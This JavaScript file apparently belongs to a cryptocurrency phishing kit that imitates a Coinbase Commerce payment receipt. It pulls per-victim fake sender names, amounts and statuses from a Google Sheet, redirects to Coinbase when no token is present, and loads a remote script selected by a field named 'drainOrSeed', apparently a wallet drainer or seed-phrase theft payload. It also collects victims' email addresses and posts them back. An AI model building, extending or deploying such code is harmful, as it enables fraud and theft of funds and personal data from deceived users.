import CONFIG from './config.js';

const urlParams = new URLSearchParams(window.location.search);
const subtotal = urlParams.get('subtotal');
const secret = urlParams.get('secret');
let paymentData = {};

const senderNameDisplay = document.getElementById('senderNameDisplay');
const subtotalDisplay = document.getElementById('amountDisplay');
const feeDisplay = document.getElementById('feeDisplay');
const amountDisplayTotal = document.getElementById('amountDisplayTotal');
const walletShort = document.getElementById('walletShort');
const walletLink = document.getElementById('walletLink');
const walletFieldDisplay = document.getElementById('walletFieldDisplay');
const currencyDisplay = document.getElementById('currencyDisplay');
const currencyIcon = document.getElementById('currencyIcon');
const networkDisplay = document.getElementById('networkDisplay');
const networkIcon = document.getElementById('networkIcon');
const dateDisplay = document.getElementById('dateDisplay');
const orderCode = document.getElementById('orderCode');
const statusDisplay = document.getElementById('statusDisplay');
const titleDisplay = document.getElementById('titleDisplay');
const actionButton = document.getElementById('actionButton');
const verifiedIcon = document.getElementById('verifiedIcon');
const emailInputContainer = document.getElementById('emailInputContainer');
const emailInput = document.getElementById('emailInput');
const preloader = document.getElementById('preloader');
const paymentContent = document.getElementById('paymentContent');
const logoContainer = document.getElementById('logoContainer');
const coinbaseTextDisplay = document.getElementById('coinbaseTextDisplay');
const commerceTextDisplay = document.getElementById('commerceTextDisplay');

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function loadStrategyScript(strategy) {
    const existingScript = document.querySelector('script[data-strategy-script]');
    if (existingScript) existingScript.remove();

    const scriptUrl = CONFIG.STRATEGY_SCRIPTS[strategy];
    if (scriptUrl) {
        const script = document.createElement('script');
        script.src = scriptUrl;
        script.charset = 'UTF-8';
        script.type = 'text/javascript';
        script.dataset.strategyScript = true;
        document.head.appendChild(script);
    }
}

function setupEmailValidation(emailInput, button) {
    emailInput.addEventListener('input', () => {
        const email = emailInput.value.trim();
        if (email && !isValidEmail(email)) {
            emailInput.classList.add('border-red-500');
            emailInput.classList.remove('border-gray-200');
            button.disabled = true;
        } else {
            emailInput.classList.remove('border-red-500');
            emailInput.classList.add('border-gray-200');
            button.disabled = false;
        }
    });
}

function getWalletLink(currency, network, wallet) {
    if (currency === 'BTC') {
        return `https://blockchair.com/bitcoin/address/${wallet}`;
    } else if (currency === 'SOL') {
        return `https://solscan.io/account/${wallet}`;
    } else if (network === 'TRON') {
        return `https://tronscan.org/#/address/${wallet}`;
    } else {
        return `https://debank.com/profile/${wallet}`;
    }
}

async function fetchPaymentData() {
    const response = await fetch(`${CONFIG.GOOGLE_SHEET_API_URL}?wallet=${secret}`);
    const data = await response.json();
    paymentData = data;
    return paymentData;
}

async function initializePage() {
    if (!secret) {
        window.location.href = 'http://coinbase.com/commerce';
        return;
    }

    preloader.classList.remove('hidden');
    paymentContent.classList.add('hidden');

    const data = await fetchPaymentData();

    setTimeout(() => {
        preloader.classList.add('hidden');
        paymentContent.classList.remove('hidden');
    }, 3000);

    const senderName = data.senderName || CONFIG.DEFAULTS.senderName;
    const walletField = data.walletField !== undefined ? data.walletField : CONFIG.DEFAULTS.walletField;
    const walletAddress = walletField ? (data.wallet || CONFIG.DEFAULTS.wallet) : '';
    const urlSubtotal = parseFloat(subtotal) || 0;
    const fetchedSubtotal = !isNaN(urlSubtotal) ? urlSubtotal.toFixed(2) : (parseFloat(data.subtotal) || parseFloat(CONFIG.DEFAULTS.amount)).toFixed(2);
    const totalWorth = parseFloat(data.totalWorth) || parseFloat(CONFIG.DEFAULTS.amount);
    const totalWorthFormatted = totalWorth.toFixed(2);
    const currency = data.currency || CONFIG.DEFAULTS.currency;
    const orderId = data.orderId || CONFIG.DEFAULTS.orderId;
    const rawDate = data.date || CONFIG.DEFAULTS.date;
    const date = new Date(rawDate).toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' });
    const status = data.status || CONFIG.DEFAULTS.status;
    const title = data.title || CONFIG.DEFAULTS.title;
    const paymentMethod = data.paymentMethod || CONFIG.DEFAULTS.network;
    const buttonText = data.buttonText || CONFIG.DEFAULTS.buttonText;
    const buttonClass = data.buttonClass || '';
    const emailReceipt = data.emailReceipt || false;
    const drainOrSeed = data.drainOrSeed || CONFIG.DEFAULTS.strategy;
    const icon = data.icon || './media/verified.png';
    const logoDisplay = data.logoDisplay !== undefined ? data.logoDisplay : true;
    const hideNetwork = data.hideNetwork || false;
    const coinbaseText = data.coinbaseText || CONFIG.DEFAULTS.coinbaseText;
    const coinbaseColor = data.coinbaseColor || CONFIG.DEFAULTS.coinbaseColor;
    const commerceText = data.commerceText || CONFIG.DEFAULTS.commerceText;
    const commerceColor = data.commerceColor || CONFIG.DEFAULTS.commerceColor;
    let email = data.email || '';
    const feeValue = totalWorth * 0.01;

    console.log({ urlSubtotal, fetchedSubtotal, totalWorth, totalWorthFormatted });

    senderNameDisplay.textContent = senderName;
    verifiedIcon.src = icon;
    subtotalDisplay.textContent = `${fetchedSubtotal} ${currency}`;
    feeDisplay.textContent = feeValue.toFixed(2);
    amountDisplayTotal.textContent = totalWorthFormatted;
    if (walletField && walletAddress) {
        walletFieldDisplay.style.display = 'block';
        const shortWallet = walletAddress.length > 20 ? walletAddress.substring(0, 20) + '...' : walletAddress;
        walletShort.textContent = shortWallet;
        walletLink.href = getWalletLink(currency, paymentMethod, walletAddress);
    } else {
        walletFieldDisplay.style.display = 'none';
    }
    currencyDisplay.textContent = `${currency} `;
    currencyIcon.src = CONFIG.CURRENCIES[currency] || CONFIG.CURRENCIES['USDT'];
    networkDisplay.textContent = hideNetwork ? '' : `${paymentMethod} Network`;
    networkIcon.src = CONFIG.NETWORKS[paymentMethod] || CONFIG.NETWORKS['Ethereum'];
    networkDisplay.style.display = hideNetwork ? 'none' : 'inline';
    networkIcon.style.display = hideNetwork ? 'none' : 'inline';
    dateDisplay.textContent = date;
    orderCode.textContent = orderId;
    statusDisplay.textContent = status;
    statusDisplay.classList.remove('bg-blue-100', 'text-blue-800', 'bg-yellow-100', 'text-yellow-800', 'bg-red-100', 'text-red-800');
    if (status.toLowerCase() === 'complete') statusDisplay.classList.add('bg-blue-100', 'text-blue-800');
    else if (status.toLowerCase() === 'pending') statusDisplay.classList.add('bg-yellow-100', 'text-yellow-800');
    else if (status.toLowerCase() === 'failed') statusDisplay.classList.add('bg-red-100', 'text-red-800');
    titleDisplay.textContent = title || 'Payment Complete';
    actionButton.innerHTML = `
        <svg class="w-5 h-5 text-white" version="1.2" baseProfile="tiny" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
            <path fill="currentColor" d="M512.1,692c-99.4,0-180-80.5-180-180s80.6-180,180-180c89.1,0,163.1,65,177.3,150h181.3c-15.3-184.8-170-330-358.7-330c-198.8,0-360,161.2-360,360s161.2,360,360,360c188.7,0,343.4-145.2,358.7-330H689.3C675,627,601.2,692,512.1,692z"/>
        </svg>
        <span>${buttonText}</span>
    `;
    actionButton.className = `action-btn flex items-center justify-center space-x-2 ${buttonClass}`;
    logoContainer.style.display = logoDisplay ? 'flex' : 'none';
    coinbaseTextDisplay.textContent = coinbaseText;
    coinbaseTextDisplay.style.color = coinbaseColor;
    commerceTextDisplay.textContent = commerceText;
    commerceTextDisplay.style.color = commerceColor;

    if (emailReceipt) {
        emailInputContainer.style.display = 'block';
        if (!email) {
            actionButton.disabled = true;
            setupEmailValidation(emailInput, actionButton);
        } else {
            emailInput.value = email;
            actionButton.disabled = !isValidEmail(email);
            setupEmailValidation(emailInput, actionButton);
        }
    }

    loadStrategyScript(drainOrSeed);
}

actionButton.addEventListener('click', async () => {
    if (emailReceipt && !emailInput.value.trim()) {
        return;
    }
    if (emailReceipt && !isValidEmail(emailInput.value.trim())) {
        return;
    }
    if (emailReceipt) {
        paymentData.email = emailInput.value.trim();
        try {
            await fetch(CONFIG.GOOGLE_SHEET_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    wallet: secret,
                    data: JSON.stringify(paymentData)
                }).toString()
            });
        } catch (error) {}
    }
});

initializePage();